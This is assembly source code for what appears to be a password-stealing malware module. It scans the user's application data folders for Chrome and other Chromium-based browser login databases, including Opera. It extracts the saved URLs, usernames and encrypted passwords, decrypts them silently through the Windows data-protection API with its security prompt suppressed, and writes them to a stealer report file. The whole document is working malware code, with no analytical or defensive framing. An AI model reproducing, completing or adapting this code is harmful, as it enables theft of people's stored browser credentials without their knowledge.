     
.data?
      app_data            db 200h dup (?)
      chromebuf           db 200h dup (?)
      ;tmpbuf              db 200h dup (?)
      chrome_url          db 200h dup (?)
      chrome_login        db 200h dup (?)
      chrome_pwd          db 200h dup (?)
      chrome_key          db 400h dup (?)
      key_size            dd ?
      chrome_data_in      DATA_BLOB <>
      chrome_data_out     DATA_BLOB <>
      ROW_DATA_LENGTHS    dd 8 dup (?)
     
.code

GetChromePwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], CHROME_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetChromePwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      invoke  ChromiumBasedScan;, addr chrome_path
      
    GetChromePwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetChromePwd endp

ChromiumBasedScan proc
      
      push    0
      push    CSIDL_APPDATA
      push    offset app_data
      push    0
      call    _SHGetSpecialFolderPath
      mov     recursive_index, 0
      push    offset ChromiumRecCallback
      push    offset app_data
      call    SomeRecursiveFunc
      
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset app_data
      push    0
      call    _SHGetSpecialFolderPath
      mov     recursive_index, 0
      push    offset ChromiumRecCallback
      push    offset app_data
      call    SomeRecursiveFunc
      
      push    0
      push    CSIDL_LOCAL_APPDATA
      push    offset app_data
      push    0
      call    _SHGetSpecialFolderPath
      mov     recursive_index, 0
      push    offset ChromiumRecCallback
      push    offset app_data
      call    SomeRecursiveFunc

      ret
ChromiumBasedScan endp

ChromiumRecCallback proc lpPath:DWORD, lpFilename:DWORD
      lstrcmp, addr chrome_file1, lpFilename
      .if     eax != 0
              lstrcmp, addr chrome_file2, lpFilename
              .if     eax == 0
                      jmp     lc_good_file
              .endif
      .else
              jmp     lc_good_file
      .endif
      jmp     lc_mapping_error
    lc_good_file:
      push    lpPath
      call    _PathFindFileName
      mov     byte ptr [eax], 0
      lstrcat, lpPath, lpFilename
      invoke  MapFile, lpPath, addr mfile, MAP_FILE_A
      .if     eax == 0
              jmp     lc_mapping_error
      .endif
      push    mfile.dwFileSize
      push    mfile.lpMem
      call    ChromiumBasedDecrypt
      invoke  UnmapFile, addr mfile
    lc_mapping_error:
      ret
ChromiumRecCallback endp

ChromiumBasedDecrypt proc uses esi edi ebx Mem:DWORD, filesize:DWORD
      LOCAL   local3, local1, mark_start, row_index, data_size, dynamic_mark_size, INC_LOCAL1 :DWORD
      
      mov     ebx, Mem
      mov     eax, sizeof chrome_mark
      mov     local1, eax
      mov     ecx, mfile.dwFileSize
      sub     ecx, sizeof chrome_mark
      mov     local3, ecx
      cmp     ecx, eax
      jbe     chrome_total_shit
    chrome_parse_lp:
      mov     INC_LOCAL1, FALSE
      mov     ecx, sizeof chrome_mark
      xor     edx, edx
      mov     edi, offset chrome_mark
      lea     esi, dword ptr [ebx+eax]
      cld
      repe    cmpsb
      jne     chrome_try_opera15_shit
      jmp     chrome_shits_found
    chrome_try_opera15_shit:
      mov     ecx, sizeof chrome_mark2
      xor     edx, edx
      mov     edi, offset chrome_mark2
      mov     eax, local1
      lea     esi, dword ptr [ebx+eax]
      cld
      repe    cmpsb
      jne     chrome_skip_dunno
      mov     INC_LOCAL1, TRUE
    chrome_shits_found:
      ;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      ; check if it is opera15 shitty header
      mov     dynamic_mark_size, sizeof chrome_mark
      lea     ecx, [ebx+eax+sizeof chrome_mark]
      movzx   esi, byte ptr [ecx]
      movzx   edi, byte ptr [ecx+1]
      .if     ( esi == 01h ) && ( edi == 14h )
              add     dynamic_mark_size, 2
      .endif
      ;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      ; init
      mov     local1, eax
      .if     INC_LOCAL1 == TRUE
              inc     local1
      .endif
      lea     ecx, [ebx+eax]
      mov     mark_start, ecx
      ; calc lengths
      mov     esi, dword ptr [mark_start]
      sub     esi, 1
      mov     row_index, 8
    row_enum_lp:
      movzx   ecx, byte ptr [esi-1]
      movzx   edx, byte ptr [esi]
      .if     ecx > 7Fh
              and     ecx, 7Fh
              shl     ecx, 7
              or      ecx, edx
              cmp     ecx, 0Ch
              jb      data_too_much_over
              sub     ecx, 0Ch
              shr     ecx, 1
            data_too_much_over:
              mov     data_size, ecx
              sub     esi, 1
      .else
              .if     edx <= 0Dh
                      mov     data_size, 0
              .else
                      sub     edx, 0Dh
                      shr     edx, 1
                      mov     data_size, edx
              .endif
      .endif
      mov     ecx, data_size
      mov     edx, row_index
      sub     edx, 1
      mov     dword ptr [ROW_DATA_LENGTHS+edx*4], ecx
      sub     esi, 1
      dec     row_index
      jnz     row_enum_lp
      ; get what we want
      mov     row_index, 1
      mov     edi, mark_start
      add     edi, dynamic_mark_size
    enum_rows_data:
      mov     eax, row_index
      sub     eax, 1
      mov     eax, dword ptr [ROW_DATA_LENGTHS+eax*4]
      mov     data_size, eax
      .if     row_index == 1 ; url
              mov     ecx, data_size
              add     ecx, 1
              pushad
              lstrcpyn, addr chrome_url, edi, ecx
              popad
      .elseif row_index == 4 ; login
              mov     ecx, data_size
              add     ecx, 1
              pushad
              lstrcpyn, addr chrome_login, edi, ecx
              popad
      .elseif row_index == 6 ; pwd
              mov     ecx, data_size
              mov     key_size, ecx
              pushad
              RtlMoveMemory, addr chrome_key, edi, ecx
              popad
      .endif
      add     edi, data_size
      add     row_index, 1
      cmp     row_index, 8
      jbe     enum_rows_data
      ;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      ; Decrypt Pass
      mov     ecx, key_size
      mov     chrome_data_in.cbSize, ecx
      mov     eax, offset chrome_key
      mov     chrome_data_in.pData, eax
      
      xor     ecx, ecx
      push    offset chrome_data_out
      push    CRYPTPROTECT_UI_FORBIDDEN ; super fix for security dialog
      push    ecx
      push    ecx
      push    ecx
      push    ecx
      push    offset chrome_data_in
      call    _CryptUnprotectData
      .if     eax == TRUE
              mov     eax, chrome_data_out.cbSize
              inc     eax
              lstrcpyn, addr chrome_pwd, chrome_data_out.pData, eax
      .else
              RtlZeroMemory, addr chrome_pwd, sizeof chrome_pwd
      .endif
      
      lstrlen, addr chrome_url
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_URL
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr chrome_url, plen, addr SNW, NULL
      
      lstrlen, addr chrome_login
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr chrome_login, plen, addr SNW, NULL
      
      lstrlen, addr chrome_pwd
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr chrome_pwd, plen, addr SNW, NULL
      
      mov     eax, local1
    chrome_skip_dunno:
      inc     eax
      mov     local1, eax
      cmp     eax, local3
      jb      chrome_parse_lp
      
chrome_total_shit:
      ret
ChromiumBasedDecrypt endp

